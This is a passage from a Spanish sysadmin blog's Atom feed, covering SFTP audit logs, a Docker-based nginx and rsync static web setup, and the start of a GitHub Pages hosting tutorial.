Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:52 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: realpath &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:52 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: stat name &lt;span class="s2"&gt;&amp;quot;/archives&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:00 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: open &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt; flags WRITE,CREATE,TRUNCATE mode &lt;span class="m"&gt;0644&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:00 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: close &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt; bytes &lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; written &lt;span class="m"&gt;12&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: opendir &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: closedir &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:12 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:12 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: remove name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:16 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: session closed &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;local&lt;/span&gt; user guest from &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1&lt;span class="o"&gt;]&lt;/span&gt;
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La lectura de estos &lt;em&gt;logs&lt;/em&gt; es todo un arte; solo quiero recalcar que las sesiones se indican mediante el PID del &lt;em&gt;internal-sftp&lt;/em&gt; y que las acciones son bastante descriptivas. En este caso solo hay una sesión que es la número 32.&lt;/p&gt;
&lt;p&gt;Si intentamos entender lo que se ha hecho en esta sesión, vemos que las acciones mas importantes son el &lt;em&gt;open/close&lt;/em&gt; de &lt;em&gt;testfile&lt;/em&gt;, en modo de escritura y tras escribir 12 &lt;em&gt;bytes&lt;/em&gt;. Poco después, en la misma sesión, se ha borrado el fichero. El resto de acciones se disparan cuando nos movemos por las carpetas.&lt;/p&gt;</content><category term="sftp"></category><category term="ssh"></category><category term="auditoría"></category></entry><entry><title>Un entorno web estático con nginx, rsync y docker</title><link href="http://www.linuxsysadmin.ml/2017/03/un-entorno-web-estatico-con-nginx-rsync-y-docker.html" rel="alternate"></link><published>2017-03-27T10:00:00+02:00</published><updated>2017-03-27T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-03-27:/2017/03/un-entorno-web-estatico-con-nginx-rsync-y-docker.html</id><summary type="html">&lt;p&gt;Hemos hablado de generar nuestro contenido HTML estático con otras herramientas, y finalmente ha llegado la hora de servirlo. Normalmente, los ficheros que cambian tal y como vamos generando páginas son pocos y nos interesa copiarlo de forma remota, pero no podemos hacerlo con &lt;strong&gt;docker&lt;/strong&gt; porque hacen falta dos servicios …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hemos hablado de generar nuestro contenido HTML estático con otras herramientas, y finalmente ha llegado la hora de servirlo. Normalmente, los ficheros que cambian tal y como vamos generando páginas son pocos y nos interesa copiarlo de forma remota, pero no podemos hacerlo con &lt;strong&gt;docker&lt;/strong&gt; porque hacen falta dos servicios.&lt;/p&gt;
&lt;p&gt;Si has asentido con la cabeza, mal. Es verdad que se necesitan dos servicios, pero hay maneras de ejecutar dos procesos en un mismo contenedor, por ejemplo &lt;a href="http://www.linuxsysadmin.ml/2017/03/multiples-servicios-en-un-mismo-contenedor-docker.html"&gt;con un gestor de procesos&lt;/a&gt;. Sin embargo, esa no es la filosofía de &lt;strong&gt;docker&lt;/strong&gt;. Un contenedor solo debería ejecutar un proceso, simplificando su contenido y siendo necesarios varios contenedores para hacer nuestro sistema modular.&lt;/p&gt;
&lt;p&gt;Así que solo nos queda pensar las partes que tiene nuestro pequeño entorno, para luego levantar contenedores que ejecuten todos los servicios necesarios, posiblemente con &lt;strong&gt;docker-compose&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor web&lt;/li&gt;
&lt;li&gt;Un servicio de transferencia de archivos&lt;/li&gt;
&lt;li&gt;Algún sitio compartido para dejar los ficheros&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Puesto que ambos servicios van a necesitar acceder al mismo sitio, necesitamos volúmenes. Sin embargo, no queremos mezclar los datos con ninguno de los otros contenedores, ya que en caso de actualizarlos, perderíamos el volumen. Eso nos deja dos opciones: un &lt;em&gt;host volume&lt;/em&gt; o un &lt;em&gt;data container&lt;/em&gt;, que usaremos por portabilidad.&lt;/p&gt;
&lt;h2&gt;El servidor web&lt;/h2&gt;
&lt;p&gt;Vamos a utilizar &lt;strong&gt;nginx&lt;/strong&gt; por su eficiencia y velocidad. Consume poco, ocupa poco, y es simple de configurar. Como ligereza adicional, vamos a partir de una imagen de &lt;em&gt;Alpine Linux&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La imagen no tiene misterio: un &lt;em&gt;Dockerfile&lt;/em&gt;, un fichero de arranque ejecutable y dos ficheros de configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb/web$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nginx tini &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /srv/www &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /etc/nginx/conf.d/default.conf
COPY nginx.conf /etc/nginx/
COPY conf.d/* /etc/nginx/conf.d/
COPY start.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/sbin/tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/syncweb/web$ cat start.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/syncweb/web$ cat nginx.conf 
worker_processes &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/syncweb/web$ cat conf.d/web 
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/syncweb/web$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a asumir que la carpeta &lt;code&gt;/srv/www/&lt;/code&gt; existe, puesto que la montaremos como un volumen.&lt;/p&gt;
&lt;h2&gt;Transfiriendo ficheros&lt;/h2&gt;
&lt;p&gt;Dada la naturaleza incremental de nuestro contenido HTML, nos viene muy bien utilizar &lt;strong&gt;rsync&lt;/strong&gt;, que funciona sobre &lt;strong&gt;ssh&lt;/strong&gt; y nos aporta encriptación, compresión y copia diferencial. Vamos a restringir el uso del &lt;strong&gt;ssh&lt;/strong&gt; mediante &lt;strong&gt;rssh&lt;/strong&gt;, permitiendo solamente usar &lt;strong&gt;rsync&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nuevamente vamos a partir de una imagen &lt;em&gt;Alpine Linux&lt;/em&gt;, que es pequeña, segura y en este caso nos sirve de maravilla. Creamos la imagen con un simple &lt;em&gt;Dockerfile&lt;/em&gt; y un fichero de arranque, con permiso de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb/rsync$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache openssh rsync rssh tini &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    sed &lt;span class="s1"&gt;&amp;#39;s/^#allowrsync/allowrsync/g&amp;#39;&lt;/span&gt; /etc/rssh.conf.default &amp;gt; /etc/rssh.conf &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    adduser web -s /usr/bin/rssh -D -H &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;web:web&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
COPY start.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/sbin/tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/syncweb/rsync$ cat start.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

chown -R web:web /srv/www
ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/sshd -D -e
gerard@aldebaran:~/docker/syncweb/rsync$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo más interesante de decir es que la carpeta &lt;code&gt;/srv/www/&lt;/code&gt; va a ser montada como volumen. Como no podemos asegurar que los permisos sean correctos, los forzamos al usuario &lt;em&gt;web&lt;/em&gt;, que es el que va a poder entrar por &lt;strong&gt;rsync&lt;/strong&gt;. Otro punto a tener en cuenta es que se ha movido la creación de la clave de &lt;em&gt;host&lt;/em&gt; al fichero &lt;em&gt;start.sh&lt;/em&gt; para evitar duplicarla a base de crear contenedores a partir de la clave de la imagen.&lt;/p&gt;
&lt;h2&gt;El contenedor de datos&lt;/h2&gt;
&lt;p&gt;Se trata de un contenedor que va a acabar tras levantar. Su única función es albergar un volumen de datos para exportarlo a otros contenedores.&lt;/p&gt;
&lt;p&gt;Lo crearemos usando una imagen mínima, que solo tiene el comando &lt;em&gt;true&lt;/em&gt;, así podemos ejecutar un comando que no hace nada y no cargamos nada adicional. Le ponemos un contenido básico, que nos permite ver que todo funciona y que luego será sustituido mediante &lt;strong&gt;rsync&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb/data$ cat Dockerfile 
FROM tianon/true
COPY index.html /srv/www/
gerard@aldebaran:~/docker/syncweb/data$ cat index.html 
&amp;lt;h1&amp;gt;Hello world&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;This is a placeholder file&amp;lt;/p&amp;gt;
gerard@aldebaran:~/docker/syncweb/data$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este contenedor solamente ejecuta &lt;em&gt;true&lt;/em&gt; y acaba. Sin embargo, su volumen sigue siendo accesible por aquellos contenedores que lo exporten.&lt;/p&gt;
&lt;h2&gt;Todo junto&lt;/h2&gt;
&lt;p&gt;Antes que nada creamos las imágenes, según los comandos habituales:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ docker build -t data data/
...  
gerard@aldebaran:~/docker/syncweb$ docker build -t web web/
...  
gerard@aldebaran:~/docker/syncweb$ docker build -t rsync rsync/
...  
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos las imágenes que hemos creado, viendo que se han hecho bien y que ocupan una cantidad de espacio razonable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE
rsync               latest              cb33669eb5f6        &lt;span class="m"&gt;54&lt;/span&gt; seconds ago       &lt;span class="m"&gt;8&lt;/span&gt;.77 MB
web                 latest              1ae71f497ae0        About a minute ago   &lt;span class="m"&gt;5&lt;/span&gt;.75 MB
data                latest              cc6555822fd9        About a minute ago   &lt;span class="m"&gt;180&lt;/span&gt; B
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya solo nos queda levantar el entorno con &lt;strong&gt;docker-compose&lt;/strong&gt;, por ejemplo con un &lt;em&gt;docker-compose.yml&lt;/em&gt; como el que sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  data:
    image: data
    hostname: data
    container_name: data
    volumes:
      - /srv/www
  rsync:
    image: rsync
    hostname: rsync
    container_name: rsync
    ports:
      - &lt;span class="s2"&gt;&amp;quot;22:22&amp;quot;&lt;/span&gt;
    volumes_from:
      - data
  web:
    image: web
    hostname: web
    container_name: web
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8000:80&amp;quot;&lt;/span&gt;
    volumes_from:
      - data
gerard@aldebaran:~/docker/syncweb$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;syncweb_default&amp;quot;&lt;/span&gt; with the default driver
Creating data
Creating rsync
Creating web
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, todos importan el contenedor de datos, y podemos copiar ficheros por &lt;strong&gt;rsync&lt;/strong&gt; al puerto 22, y ver la web en el puerto 8000. Cambiad estos valores según vuestras necesidades.&lt;/p&gt;
&lt;h2&gt;Comprobaciones&lt;/h2&gt;
&lt;p&gt;Vemos que si hacemos una petición normal, nos devuelve el contenido inicial.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ curl http://localhost:8000/
&amp;lt;h1&amp;gt;Hello world&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;This is a placeholder file&amp;lt;/p&amp;gt;
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Eso significa que el servidor web funciona y está sirviendo el contenido del contenedor de datos. Ahora vamos a probar que el contenedor &lt;strong&gt;rsync&lt;/strong&gt; puede actualizar este contenido. Para comodidad lo he puesto en un &lt;em&gt;script&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ cat sync.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

rsync -rvzc --delete content/ web@localhost:/srv/www/
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Asumimos que tenemos la carpeta &lt;code&gt;content/&lt;/code&gt; con otro fichero &lt;em&gt;index.html&lt;/em&gt;. Lo he creado a mano para la prueba, pero esto podría aparecer generado por un &lt;a href="http://www.linuxsysadmin.ml/2017/03/generadores-de-contenido-web-estaticos.html"&gt;generador de contenido estático&lt;/a&gt;. Lanzamos el &lt;em&gt;script&lt;/em&gt; por primera vez:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ ./sync.sh 
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
web@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Could not chdir to home directory /home/web: No such file or directory
sending incremental file list
index.html

sent &lt;span class="m"&gt;182&lt;/span&gt; bytes  received &lt;span class="m"&gt;41&lt;/span&gt; bytes  &lt;span class="m"&gt;63&lt;/span&gt;.71 bytes/sec
total size is &lt;span class="m"&gt;60&lt;/span&gt;  speedup is &lt;span class="m"&gt;0&lt;/span&gt;.27
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero &lt;em&gt;index.html&lt;/em&gt; ha cambiado, así que lo vuelve a enviar, y por supuesto, es lo que el servidor web va a servir, cosa que demuestra que también hace uso del contenedor de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ curl http://localhost:8000/
&amp;lt;h1&amp;gt;My autogenerated blog&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;This is the home page&amp;lt;/p&amp;gt;
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para comprobar el carácter incremental de &lt;strong&gt;rsync&lt;/strong&gt;, vamos a añadir un nuevo fichero &lt;em&gt;.html&lt;/em&gt; y a ejecutar de nuevo. En caso de un generador estático, veremos que solo se enviarían las nuevas páginas y aquellos índices que hayan cambiado, resultando en una ganancia alta, a nivel de tamaño enviado y tiempo invertido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ ./sync.sh 
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
web@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Could not chdir to home directory /home/web: No such file or directory
sending incremental file list
newpage.html

sent &lt;span class="m"&gt;179&lt;/span&gt; bytes  received &lt;span class="m"&gt;35&lt;/span&gt; bytes  &lt;span class="m"&gt;47&lt;/span&gt;.56 bytes/sec
total size is &lt;span class="m"&gt;71&lt;/span&gt;  speedup is &lt;span class="m"&gt;0&lt;/span&gt;.33
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo ha enviado el fichero nuevo, puesto que es un cambio con respecto a lo que ya tiene. De hecho, de no haber cambios, no se enviaría nada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/syncweb$ ./sync.sh 
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
web@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Could not chdir to home directory /home/web: No such file or directory
sending incremental file list

sent &lt;span class="m"&gt;128&lt;/span&gt; bytes  received &lt;span class="m"&gt;12&lt;/span&gt; bytes  &lt;span class="m"&gt;56&lt;/span&gt;.00 bytes/sec
total size is &lt;span class="m"&gt;71&lt;/span&gt;  speedup is &lt;span class="m"&gt;0&lt;/span&gt;.51
gerard@aldebaran:~/docker/syncweb$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro pequeño entorno funcional.&lt;/p&gt;</content><category term="docker"></category><category term="docker-compose"></category><category term="nginx"></category><category term="volumenes"></category><category term="rsync"></category><category term="rssh"></category></entry><entry><title>Hospedando contenido estático en Github pages</title><link href="http://www.linuxsysadmin.ml/2017/03/hospedando-contenido-estatico-en-github-pages.html" rel="alternate"></link><published>2017-03-20T10:00:00+01:00</published><updated>2017-03-20T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-03-20:/2017/03/hospedando-contenido-estatico-en-github-pages.html</id><summary type="html">&lt;p&gt;Algunas veces nos hemos planteado la posibilidad de tener nuestro propio servidor con nuestras propias aplicaciones, pero el coste del &lt;em&gt;hosting&lt;/em&gt; nos lo ha hecho replantear, especialmente para proyectos de pruebas sin beneficio. Si no nos importa hospedar contenido &lt;strong&gt;HTML&lt;/strong&gt; estático, las páginas de &lt;strong&gt;GitHub&lt;/strong&gt; pueden cumplir con nuestras necesidades …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces nos hemos planteado la posibilidad de tener nuestro propio servidor con nuestras propias aplicaciones, pero el coste del &lt;em&gt;hosting&lt;/em&gt; nos lo ha hecho replantear, especialmente para proyectos de pruebas sin beneficio. Si no nos importa hospedar contenido &lt;strong&gt;HTML&lt;/strong&gt; estático, las páginas de &lt;strong&gt;GitHub&lt;/strong&gt; pueden cumplir con nuestras necesidades.&lt;/p&gt;
&lt;p&gt;De hecho, este &lt;em&gt;blog&lt;/em&gt; está hospedado en &lt;em&gt;GitHub pages&lt;/em&gt; sin ningún coste de &lt;em&gt;hosting&lt;/em&gt;. Añadimos un nombre de registro gratuito, y obtenemos una plataforma sin coste de mantenimiento.&lt;/p&gt;
&lt;p&gt;La contrapartida es que este &lt;em&gt;blog&lt;/em&gt; está compuesto de páginas &lt;strong&gt;HTML&lt;/strong&gt; y no dispone de ninguna base de datos ni de ningún tipo de procesado en el servidor. Mantener este contenido sería una pesadilla, a no ser que se utilicen &lt;a href="http://www.linuxsysadmin.ml/2017/03/generadores-de-contenido-web-estaticos.html"&gt;generadores automáticos de HTML&lt;/a&gt;, que es lo que utilizo en este &lt;em&gt;blog&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Las páginas de &lt;em&gt;GitHub&lt;/em&gt; pueden ser de dos tipos: una por cada cuenta de usuario, y una por cada proyecto. De esta forma, como usuarios normales, deberíamos trabajar con las páginas de proyecto, puesto que solo disponemos de una página personal.&lt;/p&gt;
&lt;h2&gt;Páginas de proyecto&lt;/h2&gt;
&lt;p&gt;Cada repositorio puede disponer de un espacio web propio. Solo se necesita indicar a &lt;em&gt;GitHub&lt;/em&gt; qué rama tratar como &lt;em&gt;document root&lt;/em&gt;, para que pueda servirla adecuadamente. Vamos a ilustrar como se hace con un ejemplo:&lt;/p&gt;
&lt;p&gt;Vamos a empezar creando un nuevo repositorio en &lt;a href="https://github.com/new"&gt;https://github.com/new&lt;/a&gt;, de acuerdo a vuestras preferencias. En mi caso, me he dejado llevar por la sugerencia, puesto que este nombre no influye en nada; de esta forma nuestro repositorio se llama &lt;code&gt;didactic-meme&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Como no puede ser de otra forma, vamos a tener que clonar este repositorio para poder trabajar con él.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects$ git clone https://github.com/Sirtea/didactic-meme.git
Cloning into &lt;span class="s1"&gt;&amp;#39;didactic-meme&amp;#39;&lt;/span&gt;...
warning: You appear to have cloned an empty repository.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
gerard@aldebaran:~/projects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras poner algún fichero en la rama &lt;code&gt;master&lt;/code&gt; y hacer un &lt;em&gt;commit&lt;/em&gt;, podemos crear una rama para alojar nuestro contenido &lt;strong&gt;HTML&lt;/strong&gt;. Esta rama se puede llamar &lt;code&gt;master&lt;/code&gt; (que viene por defecto) o &lt;code&gt;gh-pages&lt;/code&gt;. Esto es una decisión personal, pero como yo utilizo un generador de páginas &lt;strong&gt;HTML&lt;/strong&gt;, yo prefiero dejar la rama &lt;code&gt;master&lt;/code&gt; para el contenido escrito, y la rama &lt;code&gt;gh-pages&lt;/code&gt; para el contenido generado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects/didactic-meme$ git checkout -b gh-pages master
Switched to a new branch &lt;span class="s1"&gt;&amp;#39;gh-pages&amp;#39;&lt;/span&gt;
gerard@aldebaran:~/projects/didactic-meme$ git branch -v
* gh-pages 9b33086 Some master content
  master   9b33086 Some master content
gerard@aldebaran:~/projects/didactic-meme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí el flujo de trabajo es el que usaríamos normalmente con &lt;strong&gt;Git&lt;/strong&gt;. Creamos el contenido &lt;strong&gt;HTML&lt;/strong&gt;, lo copiamos a lo generamos; el resto es tan simple como hacer un &lt;em&gt;commit&lt;/em&gt; y subirlo a &lt;em&gt;GitHub&lt;/em&gt; con un &lt;em&gt;push&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects/didactic-meme$ cat index.html 
&amp;lt;h1&amp;gt;Hello World&amp;lt;/h1&amp;gt;
gerard@aldebaran:~/projects/didactic-meme$ 
&lt;/pre&gt;&lt;/div&gt;


